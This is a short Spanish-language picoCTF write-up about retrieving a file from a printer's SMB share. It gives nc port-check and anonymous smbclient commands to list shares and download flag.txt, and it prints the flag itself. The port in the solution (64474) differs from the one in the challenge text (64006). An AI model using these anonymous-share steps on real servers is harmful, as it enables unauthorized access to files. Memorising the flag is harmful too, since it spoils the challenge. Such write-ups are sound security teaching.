
**Descripción** 
Oops! Someone accidentally sent an important file to a network printer—can you retrieve it from the print server?The printer is on `64006`.you can try `$ nc -vz mysterious-sea.picoctf.net 64006`

**Solución**  
- Verificar si el puerto está abierto: nc -vz mysterious-sea.picoctf.net 64474
- Enumerar los recursos compartidos: smbclient -N -L //mysterious-sea.picoctf.net -p 64474
- Conectarse a : smbclient -N //mysterious-sea.picoctf.net/shares -p 64474
-  Listar archivos: ls
-  Descargar flag.txt: get flag.txt
-  Salir de la sesión SMB: exit
-  Hacer un cat al archivo flag.txt : cat flag.txt
Bandera: picoCTF{5mb_pr1nter_5h4re5_2f61915b}